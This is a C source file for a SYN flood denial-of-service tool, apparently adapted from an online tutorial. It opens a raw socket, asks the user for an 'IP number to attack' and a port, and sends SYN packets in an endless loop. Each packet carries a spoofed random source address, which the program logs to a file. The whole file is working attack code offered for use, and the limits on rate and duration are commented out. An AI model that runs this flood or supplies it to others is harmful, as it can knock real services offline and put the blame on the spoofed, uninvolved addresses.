/*
    Syn Flood DOS with LINUX sockets
*/

/*Code based on http://www.binarytides.com/syn-flood-dos-attack/
 *@authors: Ahmet Erdem Cagatay & Salih Can
 */

#include<stdio.h>
#include<string.h>
#include<sys/socket.h>   //provides declarations for socket programramming 
#include<stdlib.h>       //for exit(0);
#include<errno.h>        //For errno - the error number
#include<netinet/tcp.h>  //Provides declarations for tcp header
#include<netinet/ip.h>   //Provides declarations for ip header
#include<time.h>	 //In case of using duration.
#include<unistd.h>	 //To avoid unnecessary warnings after compilation 
#include<arpa/inet.h>    //To avoid unnecessary warnings after compilation

struct pseudo_header    //needed for checksum calculation
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
     
    struct tcphdr tcp;
};

//checksum is needed for socket transmission. Sockets without checksum calculations are not accepted by destination.
 
unsigned short csum(unsigned short *ptr,int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;
 
    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }
 
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
     
    return(answer);
}

//used for checking IP number's validity.
int isInteger(char *str){
    int flag=0;
    for(int i=0;i<strlen(str);i++){
	if(isdigit(str[i]))flag=1;
    }
    return flag;
}

//checks if IP number is valid
int check_IP(char *IP){
    int num;
    int flag=1;
    int counter=0;

    char* p=strtok(IP, ".");
    
    while(p!=NULL){
	if(isInteger(p)){
            num=atoi(p);
            if(num>=0&&num<=255&&counter++<4){
		flag=1;
		p=strtok(NULL,".");
            }
	    else{
	 	flag=0;
		break;
	    }
	}
	else{
	    flag=0;
	    break;
	}
     }
     return flag&&counter==4;
}

/********************************************************************/
 
int main (void)
{
    int integerIP=67;	//To create random source IPs.
    char stringIP[3];
    int sourcePort;

    int count=0;
       
    FILE *file;		//To store created IP numbers.
    file=fopen("IPNumbersCreated.txt","w");


    //Accepting interface name fron the user and writing it to a .conf file.
    char intface[20];
    FILE *interfaceFile;
    interfaceFile=fopen("interface.conf","w");

    printf("Enter interface to send packets through: ");
    fgets(intface, 20, stdin);
    fprintf(interfaceFile, "%s\n", intface);
    fclose(interfaceFile);
  
    //To accept destination IP address and port number from the user. 
    char dIP[16];
    char pseudodIP[16]; 
    int destPort;
 
    printf("Enter IP number to attack: ");
    fgets(dIP, 16, stdin);

    strcpy(pseudodIP,dIP);

    while(check_IP(pseudodIP)==0){
       printf("Enter a valid IP number to attack: ");
       fgets(dIP,16,stdin);
       strcpy(pseudodIP,dIP); 
    }

    printf("Enter destination port number: ");
    scanf("%d",&destPort);

    //Demonstration of destionation IP address and port number.
    printf("IP Number: ");
    puts(dIP);
    printf("Port Number: %d\n",destPort);

    //Setting the seed for random creation.
    srand(time(NULL));

    //Uncomment in case of creating a certain number of IP addresses.
/*  
    int numToCreate;
    printf("Enter number of IP addresses you want to create: ");
    scanf("%d",&numToCreate);
    printf("\n");
*/

    //Uncomment in case of practicing the attack in a certain amount of time.
/*
    int duration;
    printf("Enter duration: ");
    scanf("%d", &duration);

    clock_t startTime=clock();
    int seconds;
*/

//for(int i=0;i<numToCreate;i++)

while(1)
{
    //Create a raw socket
    int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
    //Datagram to represent the packet
    char datagram[4096] , source_ip[32];
    //IP header
    struct iphdr *iph = (struct iphdr *) datagram;
    //TCP header
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;

    integerIP=1+(rand()%254);  //creating random IP numbers.

    //Uncomment in case of excluding a certain IP number from created IP addresses.
/*
    while(integerIP==67){
	integerIP=1+(rand()%254);
    }
*/

    //Adding created integer to source host address.
    int length = snprintf( NULL, 0, "%d", integerIP );
    char* str = malloc( length + 1 );
    snprintf( str, length + 1, "%d", integerIP );
    strcpy(source_ip , "10.20.50.");
    strcat(source_ip,str);
    free(str);
   
    sin.sin_family = AF_INET;
    sin.sin_port = htons(destPort);
    sin.sin_addr.s_addr = inet_addr (dIP);
     
    memset (datagram, 0, 4096); /* zero out the buffer */
     
    //Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 1;
    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
    iph->id = htons(54321);  //Id of this packet
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;                          //Set to 0 before calculating checksum
    iph->saddr = inet_addr ( source_ip );    //Spoof the source ip address
    iph->daddr = sin.sin_addr.s_addr;
     
    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
     
    //TCP Header
    sourcePort=1024+(rand()%(65535-1024));
    tcph->source = htons (sourcePort);
    tcph->dest = htons (destPort);
    tcph->seq = 0;
    tcph->ack_seq = 1000;
    tcph->doff = 5;      /* first and only tcp segment */
    tcph->fin=0;
    tcph->syn=1;
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = htons (5840); /* maximum allowed window size */
    tcph->check = 0;             /* if you set a checksum to zero, your kernel's IP stack
                                 should fill in the correct checksum during transmission */
    tcph->urg_ptr = 0;

    //Now the IP checksum
    psh.source_address = inet_addr( source_ip );
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);
     
    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
     
    tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));
     
    //IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
        exit(0);
    }
    
    //Send the packet
    if (sendto (s,                      /* our socket */
            datagram,                   /* the buffer containing headers and data */
            iph->tot_len,               /* total length of our datagram */
            0,                          /* routing flags, normally always 0 */
            (struct sockaddr *) &sin,   /* socket addr, just like in */
            sizeof (sin)) < 0)          /* a normal send() */
    {
         printf ("error\n");
    }

    //Data send successfully
    else
    {
        fprintf (file,"%d. %s\n",count,source_ip);
    }
    
    close(s); 
    count++;

    //To delay SYN tranmission (This version stabilize OS' clock)
/*  
    usleep(50000); 
    clock_t elapsedTime=clock()-startTime;
    seconds=elapsedTime/CLOCKS_PER_SEC;
    if((seconds-duration)>0)break;
*/ 


    //To delay SYN transmission (with consuming OS' clock)    
/*
    for(int j=0;j<150;j++){
	for(int k=0;k<150;k++){
	}
    }
*/

} 
    printf("Number of IP addresses created: %d\n",count);
    fclose(file); 
    return 0;
}
